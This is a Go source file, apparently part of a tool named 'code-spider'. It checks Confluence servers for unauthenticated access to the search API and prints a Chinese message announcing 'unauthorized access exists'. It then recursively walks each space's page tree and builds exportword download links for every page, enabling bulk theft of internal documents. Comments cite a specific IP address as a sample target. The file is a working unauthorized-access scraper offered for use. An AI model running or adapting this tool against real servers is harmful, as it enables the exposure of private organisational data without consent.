package core

import (
	"bytes"
	"code-spider/util"
	"encoding/json"
	"fmt"
	"github.com/antchfx/htmlquery"
	"golang.org/x/net/html"
	"strings"
)

type ConfluenceMain struct {
	Results        []ConfluenceData `json:"results"`
	Start          int              `json:"start"`
	Limit          int              `json:"limit"`
	Size           int              `json:"json"`
	TotalSize      int              `json:"totalSize"`
	CqlQuery       string           `json:"cqlQuery"`
	SearchDuration int              `json:"searchDuration"`
	Links          struct{}         `json:"_links"`
}

type ConfluenceData struct {
	Space                 ConfluenceSpace `json:"space"`
	Title                 string          `json:"title"`
	Excerpt               string          `json:"excerpt"`
	Url                   string          `json:"url"`
	ResultGlobalContainer struct{}        `json:"resultGlobalContainer"`
	EntityType            string          `json:"entityType"`
	IconCssClass          string          `json:"iconCssClass"`
	LastModified          string          `json:"lastModified"`
	FriendlyLastModified  string          `json:"friendlyLastModified"`
	Timestamp             int             `json:"timestamp"`
}

type ConfluenceSpace struct {
	Id         int                  `json:"id"`
	Key        string               `json:"key"`
	Name       string               `json:"name"`
	Icon       struct{}             `json:"icon"`
	Type       string               `json:"type"`
	Links      struct{}             `json:"_links"`
	Expandable ConfluenceExpandable `json:"_expandable"`
}

type ConfluenceExpandable struct {
	Metadata    string `json:"metadata"`
	Description string `json:"description"`
	Homepage    string `json:"homepage"`
}

func Confluence1(target string, cookie string) []string {
	url_api1 := target + "/rest/experimental/search?cql=type%20=%20space&expand=space.icon&_=1695003716277"
	resp1, err := util.DoGet(url_api1, cookie)
	if err != nil {
		return nil
	}
	download_list := []string{}

	var confluencemain ConfluenceMain
	if resp1.StatusCode() == 200 {
		fmt.Println(fmt.Sprintf("[+] %s 存在未授权", target))
		err = json.Unmarshal(resp1.Body(), &confluencemain)
		confluencedata := confluencemain.Results
		if err != nil {
			return nil
		}
		for i := 0; i < len(confluencedata); i++ {

			var NodeUrllist []string
			var NodeTitlelist []string

			confluencespace := confluencedata[i].Space
			confluenceexpandable := confluencespace.Expandable
			homepageid := strings.Split(confluenceexpandable.Homepage, "/")[len(strings.Split(confluenceexpandable.Homepage, "/"))-1]

			fmt.Println(fmt.Sprintf("[!] 获取空间名称: %s url: %s id: %s", confluencedata[i].Title, confluencedata[i].Url, homepageid))

			NodeUrllist = append(NodeUrllist, "/pages/viewpage.action?pageId="+homepageid)
			NodeTitlelist = append(NodeTitlelist, confluencedata[i].Title)
			url_api2 := target + fmt.Sprintf("/plugins/pagetree/naturalchildren.action?decorator=none&excerpt=false&sort=position&reverse=false&disableLinks=false&expandCurrent=true&placement=sidebar&hasRoot=true&pageId=%s&treeId=0&startDepth=0&mobile=false&ancestors=%s&treePageId=%s&_=1695026583391", homepageid, homepageid, homepageid)
			resp2, err := util.DoGet(url_api2, cookie)
			if err != nil {
				return nil
			}
			ConfluenceDoc, err := html.Parse(bytes.NewReader(resp2.Body()))
			if err != nil {
				return nil
			}
			ConfluenceNode, err := htmlquery.QueryAll(ConfluenceDoc, "//span[@class='plugin_pagetree_children_span']/a") // <span class="plugin_pagetree_children_span"
			if err != nil {
				return nil
			}
			for _, urlNode := range ConfluenceNode {
				if strings.Contains(htmlquery.SelectAttr(urlNode, "href"), ".action?pageId=") {
					fmt.Println(fmt.Sprintf("[!] 获取页面: %s 标题: %s", htmlquery.SelectAttr(urlNode, "href"), htmlquery.OutputHTML(urlNode, false)))
					NodeUrllist = append(NodeUrllist, htmlquery.SelectAttr(urlNode, "href"))
					NodeTitlelist = append(NodeTitlelist, htmlquery.OutputHTML(urlNode, false))
					NodeUrllist_, NodeTitlelist_ := CheckurlNodeIndex(target, homepageid, htmlquery.SelectAttr(urlNode, "href"), cookie)
					NodeUrllist = append(NodeUrllist, NodeUrllist_...)
					NodeTitlelist = append(NodeTitlelist, NodeTitlelist_...)
				}
			}

			NodeUrllist = util.RemoveDuplicate(NodeUrllist)
			NodeTitlelist = util.RemoveDuplicate(NodeTitlelist)

			for j := 0; j < len(NodeUrllist); j++ {
				//fmt.Println(NodeUrllist[j], NodeTitlelist[j])
				//https://47.112.169.165/spaces/flyingpdf/pdfpageexport.action?pageId=68198340
				//url := fmt.Sprintf("%s/spaces/flyingpdf/pdfpageexport.action?%s&title=%s", target, strings.Split(NodeUrllist[j], "?")[1], NodeTitlelist[j])
				//https://47.112.169.165/exportword?pageId=68198340
				url := fmt.Sprintf("%s/exportword?%s&title=%s", target, strings.Split(NodeUrllist[j], "?")[1], NodeTitlelist[j])
				download_list = append(download_list, url)
			}
		}
	}
	return download_list
}

func CheckurlNodeIndex(target string, treePageId string, pageId string, cookie string) ([]string, []string) {
	pageId = strings.Split(strings.Split(pageId, "?")[1], "=")[1]
	url_api := target + fmt.Sprintf("/plugins/pagetree/naturalchildren.action?decorator=none&excerpt=false&sort=position&reverse=false&disableLinks=false&expandCurrent=true&placement=sidebar&hasRoot=true&pageId=%s&treeId=0&startDepth=0&mobile=false&treePageId=%s&_=1695028277882", pageId, treePageId)
	//fmt.Println(url_api)
	resp, err := util.DoGet(url_api, cookie)
	if err != nil {
		return []string{}, []string{}
	}
	ConfluenceDoc, err := html.Parse(bytes.NewReader(resp.Body()))
	if err != nil {
		return []string{}, []string{}
	}
	ConfluenceNode, err := htmlquery.QueryAll(ConfluenceDoc, "//div[@class='plugin_pagetree_children_content']/span") // <div class="plugin_pagetree_children_content"> <span class="plugin_pagetree_children_span"
	if err != nil {
		return []string{}, []string{}
	}

	var NodeUrllist []string
	var NodeTitlelist []string
	for _, urlNode := range ConfluenceNode {
		//if strings.Contains(htmlquery.SelectAttr(urlNode, "href"), ".action?pageId=") {
		if strings.Contains(htmlquery.SelectAttr(urlNode, "id"), "childrenspan") {
			id := strings.Replace(htmlquery.SelectAttr(urlNode, "id"), "childrenspan", "", -1)
			if strings.Contains(id, "-") {
				id = strings.Split(id, "-")[0]
			}
			id = "/pages/viewpage.action?pageId=" + id
			title, _ := htmlquery.Query(urlNode, "//a")
			fmt.Println(fmt.Sprintf("[!] 获取页面: %s 标题: %s", id, htmlquery.OutputHTML(title, false)))
			NodeUrllist = append(NodeUrllist, id)
			NodeTitlelist = append(NodeTitlelist, htmlquery.OutputHTML(title, false))
			NodeUrllist_, NodeTitlelist_ := CheckurlNodeIndex(target, treePageId, id, cookie)
			NodeUrllist = append(NodeUrllist, NodeUrllist_...)
			NodeTitlelist = append(NodeTitlelist, NodeTitlelist_...)
		}
	}
	return NodeUrllist, NodeTitlelist
}
